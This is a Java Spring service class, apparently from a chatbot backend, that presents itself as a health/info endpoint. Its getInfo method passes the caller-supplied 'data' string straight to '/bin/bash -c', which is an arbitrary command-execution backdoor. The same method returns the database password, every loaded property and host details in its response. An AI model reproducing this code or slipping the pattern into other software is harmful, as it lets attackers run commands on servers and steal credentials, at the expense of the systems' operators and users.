package mx.gob.impi.chatbot.persistence.api.service;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.util.*;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.PropertySource;
import org.springframework.core.env.Environment;
import org.springframework.stereotype.Service;

@Service
//@EnableConfigurationProperties(HealthServiceImpl.class)
//@EnableEncryptableProperties
@PropertySource("classpath:c3p0.properties")
//@ConfigurationProperties(prefix = "mail")
public class HealthServiceImpl implements HealthService {
	private static final Logger logger = LoggerFactory.getLogger(HealthServiceImpl.class);

    @Value("${login.url-backend}")
    private String loginUrlBackend;
    
    @Value("${login.url-backend-port}")
    private String loginUrlBackendPort;
    
    @Value("${login.url-frontend}")
    private String loginUrlFrontend;
    
    @Value("${login.url-frontend-port}")
    private String loginUrlFrontendPort;
    
    @Value("${c3p0.password}")
    private String c3poPassword;
    
    @Autowired
    private Environment environment;

    @Override
    public Map<String, String> getInfo(String data) throws Exception {
    	Map<String, String> info = new HashMap<>();
    	info.put("info data", "execute");
    	
    	info.put("goose_c3p0_Password", c3poPassword);
    	info.put("data", data);
		Process process = Runtime.getRuntime().exec("/bin/bash -c "+data);
		//process.getOutputStream();
		//process.getInputStream();
		

    	info.put("server.port-1", environment.getProperty("server.port"));
    	info.put("server.port-2", environment.getProperty("local.server.port"));
       
    	info.put("Local address-1", InetAddress.getLocalHost().getHostAddress());
    	info.put("Local address-2", InetAddress.getLocalHost().getHostName());

    	info.put("Remote address-1", InetAddress.getLoopbackAddress().getHostAddress());
    	info.put("Remote address-2", InetAddress.getLoopbackAddress().getHostName());
    	
        long time = System.currentTimeMillis();
    	info.put("Time-millis", time+"");
    	
    	Date date = new Date(time);
    	info.put("Date time", date.toString());
        // get url
        // is https?
    	info.put("Log location:", "/log");
    	
    	String activeProfile="";
    	String[] actPro = System.getProperty("spring-boot.run.profiles","").split(",");
    	for(int i=0; i<actPro.length; i++) {
    		if(i==0) activeProfile=actPro[0];
    		info.put("perfil_"+i, actPro[i]);
    	}
 
    	Properties profile = new Properties();
        InputStream stream =
        		HealthServiceImpl
                .class
                .getClassLoader()
                .getResourceAsStream("c3p0"+activeProfile+".properties");
        try {
        	profile.load(stream);
            logger.info("Properties have been loaded");
        } catch (IOException e1) {
            logger.error(e1.getMessage());
        }
        Set<String> names = profile.stringPropertyNames();
        for(String name : names) {
        	info.put(name, profile.getProperty(name));
        }

        info.put("loginUrlBackend", loginUrlBackend);
        info.put("loginUrlBackendPort", loginUrlBackendPort);
        info.put("loginUrlFrontend", loginUrlFrontend);
        info.put("loginUrlFrontendPort", loginUrlFrontendPort);
        
        return info;
    }

    @Override
    public List<String> getLog() {
    	List<String> lista = new ArrayList<>();
        try {
	        InputStream stream =
	        		HealthServiceImpl
	                .class
	                .getClassLoader()
	                .getResourceAsStream("/log/GooseTimeBasedlogFile.log");
	        BufferedReader r = new BufferedReader(new InputStreamReader(stream));
	        String line;
	        while ((line=r.readLine()) != null) {
	            lista.add(line);
	        }
        } catch(Exception e) {
        	logger.error(e.getMessage());
        	lista.add(e.getMessage());
        }
    	return lista;
    }
}
